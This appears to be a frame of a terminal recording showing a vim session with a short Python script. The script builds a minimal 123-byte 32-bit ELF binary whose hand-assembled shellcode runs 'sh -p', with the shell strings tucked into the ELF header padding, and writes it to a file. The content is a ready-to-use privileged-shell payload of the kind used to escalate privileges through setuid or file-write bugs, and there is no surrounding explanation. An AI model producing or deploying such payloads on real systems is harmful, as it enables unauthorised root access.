[7.128724, "o", "\u001b[1;1H\u001b[35mimport\u001b[m struct, sys\r\r\nV = \u001b[31m0x08048000\u001b[m\u001b[2;15H\u001b[K\u001b[3;1Hcode = \u001b[36mbytes\u001b[m([\u001b[3;15H\u001b[K\u001b[4;5H\u001b[31m0x31\u001b[m, \u001b[31m0xC0\u001b[m,\u001b[23C\u001b[34m# xor eax, eax\u001b[m\r\r\n    \u001b[31m0x50\u001b[m,\u001b[29C\u001b[34m# push eax (NULL envp)\u001b[m\r\r\n    \u001b[31m0x68\u001b[m, \u001b[31m0x0C\u001b[m, \u001b[31m0x80\u001b[m, \u001b[31m0x04\u001b[m, \u001b[31m0x08\u001b[m,     \u001b[34m# push \"-p\" @ 0x0804800c\u001b[m\r\r\n    \u001b[31m0x68\u001b[m, \u001b[31m0x09\u001b[m, \u001b[31m0x80\u001b[m, \u001b[31m0x04\u001b[m, \u001b[31m0x08\u001b[m,     \u001b[34m# push \"sh\" @ 0x08048009\u001b[m\r\r\n    \u001b[31m0x89\u001b[m, \u001b[31m0xE1\u001b[m,\u001b[23C\u001b[34m# mov ecx, esp (argv)\u001b[m\r\r\n    \u001b[31m0xBB\u001b[m, \u001b[31m0x09\u001b[m, \u001b[31m0x80\u001b[m, \u001b[31m0x04\u001b[m, \u001b[31m0x08\u001b[m,     \u001b[34m# mov ebx, \"sh\"\u001b[m\r\r\n    \u001b[31m0x31\u001b[m, \u001b[31m0xD2\u001b[m,\u001b[23C\u001b[34m# xor edx, edx\u001b[m\r\r\n    \u001b[31m0xB0\u001b[m, \u001b[31m0x0B\u001b[m,\u001b[23C\u001b[34m# execve\u001b[m\r\r\n    \u001b[31m0xCD\u001b[m, \u001b[31m0x80\u001b[m,\r\r\n])\r\r\n\u001b[33massert\u001b[m \u001b[36mlen\u001b[m(code) == \u001b[31m26\u001b[m\r\r\nehdr = \u001b[36mbytearray\u001b[m(\u001b[31m52\u001b[m)\r\r\nehdr[\u001b[31m0\u001b[m:\u001b[31m8\u001b[m] = \u001b[31mb\"\u001b[m\u001b[35m\\x7f\u001b[m\u001b[31mELF\u001b[m\u001b[35m\\x01\\x01\\x01\\x00\u001b[m\u001b[31m\"\u001b[m\r\r\nehdr[\u001b[31m9\u001b[m:\u001b[31m15\u001b[m] = \u001b[31mb\"sh\u001b[m\u001b[35m\\x00\u001b[m\u001b[31m-p\u001b[m\u001b[35m\\x00\u001b[m\u001b[31m\"\u001b[m\u001b[9C\u001b[34m# strings hidden in EI_PAD\u001b[m\r\r\nehdr[\u001b[31m15\u001b[m] = \u001b[31m0\u001b[m\r\r\nstruct.pack_into(\u001b[31m\"<HHIIIIIHHHHHH\"\u001b[m, ehdr, \u001b[31m16\u001b[m,\u001b[20;18H\u001b[31m2\u001b[m, \u001b[31m3\u001b[m, \u001b[31m1\u001b[m, V + \u001b[31m84\u001b[m, \u001b[31m52\u001b[m, \u001b[31m0\u001b[m, \u001b[31m0\u001b[m, \u001b[31m52\u001b[m, \u001b[31m32\u001b[m, \u001b[31m1\u001b[m, \u001b[31m0\u001b[m, \u001b[31m0\u001b[m, \u001b[31m0\u001b[m)\r\r\nphdr = \u001b[36mbytearray\u001b[m(\u001b[31m32\u001b[m)\r\r\nstruct.pack_into(\u001b[31m\"<IIIIIIII\"\u001b[m, phdr, \u001b[31m0\u001b[m,\u001b[23;18H\u001b[31m1\u001b[m, \u001b[31m0\u001b[m, V, \u001b[31m0\u001b[m, \u001b[31m123\u001b[m, \u001b[31m123\u001b[m, \u001b[31m5\u001b[m, \u001b[31m0x1000\u001b[m)\r\r\ndata = \u001b[36mbytes\u001b[m(ehdr) + \u001b[36mbytes\u001b[m(phdr) + code\r\r\ndata += \u001b[31mb\"\u001b[m\u001b[35m\\x00\u001b[m\u001b[31m\"\u001b[m * (\u001b[31m123\u001b[m - \u001b[36mlen\u001b[m(data))\r\r\n\u001b[33massert\u001b[m \u001b[36mlen\u001b[m(data) == \u001b[31m123\u001b[m\r\r\n\u001b[36mopen\u001b[m(sys.argv[\u001b[31m1\u001b[m], \u001b[31m\"wb\"\u001b[m).write(data)\r\r\n\u001b[36mprint\u001b[m(\u001b[31m\"wrote\"\u001b[m, \u001b[36mlen\u001b[m(data), \u001b[31m\"bytes\"\u001b[m)\r\r\n\u001b[1m\u001b[34m~                                                                                                             \u001b[30;1H~                                                                                                 "]
